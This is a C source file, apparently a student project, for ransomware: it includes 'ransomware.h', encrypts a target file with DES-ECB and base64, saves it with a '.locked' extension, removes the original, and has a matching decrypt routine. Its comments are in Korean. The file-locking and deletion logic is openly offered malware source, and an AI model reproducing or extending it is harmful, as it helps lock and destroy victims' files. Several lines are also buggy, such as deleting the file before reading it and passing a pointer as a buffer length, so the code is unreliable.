#include "des.h"
#include "util.h"
#include "ecb.h"
#include "ransomware.h"

void encrypt_single_file(char* filename, char* key, char* saveway){
    /*
        변수 선언 파트
    */

    int filename_len1 = strlen(filename);
    int filename_len2 = strlen(saveway);

    char* temp = ".locked";
    char* filename_locked = char_array_init(filename_len1+ filename_len2 + 7);
    strcpy(filename_locked, saveway);
    strcat(filename_locked, filename);
    strcat(filename_locked, temp);
    puts(filename_locked);

    char* filename_path = char_array_init(filename_len1+ filename_len2);
    strcpy(filename_path, saveway);
    strcat(filename_path, filename);
    puts(filename_path);

    //1단계: 파일에서 바이트를 추출해내기
    int raw_filelen = 0;
    char* raw_byte = NULL;

    remove(filename_path);
    //2단계: 바이트를 des에 맞는 사이즈로 바꾸기
    int encap_len = 0;
    char* encap = NULL;
    int* encap_bit = NULL;

    //3단계: des로 암호화 하기
    int* encrypted = NULL;
    int encrypted_len = 0;

    //4단계: byte에서 bit로 바꾸기
    int* encrypted_bit = NULL;
    char* encrypted_byte = NULL;

    //5단계: base64로 인코딩하기
    int encoded_len = 0;
    char* encoded = NULL;

    //6단계: 파일로 저장하기

    /*
        로직 파트
    */


    //1단계: 파일에서 바이트를 추출해내기
    raw_filelen = filesize(filename);             //파일 길이 얻기
    raw_byte = file_byte_read(filename);          //파일로부터 바이트 얻기

    //2단계: 바이트를 des에 맞는 사이즈로 바꾸기
    encap_len = encap_size(raw_byte, raw_filelen);
    encap = encapsulate_des_compatable_size(raw_byte, raw_filelen);
    encap_bit = byte_to_int(encap, encap_len);       //바이트로부터 비트 값 얻기

    //3단계: des로 암호화 하기
    encrypted_len = encap_len * 8 ;
    encrypted = ecb_des_encrypt(encap_bit, key, encrypted_len);
  
     //4단계: bit에서 byte로 바꾸기
    encrypted_bit = array_init(encap_len * 8);
    array_shallow_copy(encrypted_bit, encrypted, encap_len * 8);    //아직 des가 없어서 encap을 바로 씀
    encrypted_byte = int_to_byte(encrypted_bit, encap_len * 8);

    //5단계: base64로 인코딩하기
    encoded_len = base64_encode_size(encap_len);
    encoded = base64_encode(encrypted_byte, encap_len);


    //6단계: 파일로 저장하기
    file_byte_write(filename_locked, encoded, encoded_len);

    free(raw_byte);
    free(encap);
    free(encap_bit);

    free(encrypted_bit);
    free(encrypted_byte);
    free(encoded);

    raw_byte = NULL;
    encap = NULL;
    encap_bit = NULL;

    encrypted_bit = NULL;
    encrypted_byte = NULL;
    encoded = NULL;

    return;
}

void decrypt_single_file(char* filename_locked, char* key, char* path){
    /*
        변수 선언 파트
    */

           printf("In: %s \n",path );

    int filename_len = strlen(filename_locked) - 7;
    char* filename = char_array_init(filename_len);
    strncpy(filename, filename_locked, filename_len);

    int filename_len1 = strlen(filename);
    int filename_len2 = strlen(path);

    char* save_file = char_array_init(filename_len1 + filename_len2);
    strcpy(save_file, path);
    strcat(save_file, filename);
    puts(save_file);

    char* remove_file = char_array_init(save_file + 7);
    strcpy(remove_file, save_file);
    strcat(remove_file, ".locked");
    puts(remove_file);

    //7단계: 파일에서 바이트 추출하기
    int re_filelen = 0;
    char* re_byte = NULL;

    //8단계: base64로 디코딩하기
    int decoded_len = 0;
    char* decoded = NULL;

    //9단계 byte -> int로 바꾸기
    int* re_bit = NULL;

    //10단계: des로 복호화 하기
    int* decrypted_bit = NULL;


    //11단계: int -> byte로 바꾸기
    char* decrypted_byte = NULL;

    //12단계 복호화된 바이트의 헤더와 패딩을 제거하기
    char* decap = NULL;
    int decap_len = 0;

    //13단계 파일로 다시 저장하기


    /*
        로직 파트
    */


    //7단계: 파일에서 바이트만 추출하기 - 뒤에 널문자 하나 뗌
    re_filelen = filesize(remove_file);
    re_byte = file_byte_read(remove_file);

    //8단계: base64로 디코딩하기
    decoded_len = base64_decode_size(re_byte, re_filelen);
    decoded = base64_decode(re_byte, re_filelen);

    //9단계 byte -> int로 바꾸기
    re_bit = byte_to_int(decoded, decoded_len);

    //10단계: des로 복호화 하기
    decrypted_bit = ecb_des_decrypt(re_bit, key, decoded_len * 8);

    //11단계: int -> byte로 바꾸기
    decrypted_byte = int_to_byte(decrypted_bit, decoded_len * 8);

    //12단계 복호화된 바이트의 헤더와 패딩을 제거하기
    decap = decapsulate_des_compatable_size(decrypted_byte);
    decap_len = decap_size(decrypted_byte);
  
    //13단계 파일로 다시 저장하기
    file_byte_write(save_file, decap, decap_len);
    remove(remove_file);
    /*
        메모리 관리
    */

    free(re_byte);
    free(decoded);

    free(re_bit);
    free(decrypted_bit);
    free(decrypted_byte);

    free(decap);

    re_byte = NULL;
    decoded = NULL;

    re_bit = NULL;
    decrypted_bit = NULL;
    decrypted_byte = NULL;

    decap = NULL;

    return;
}
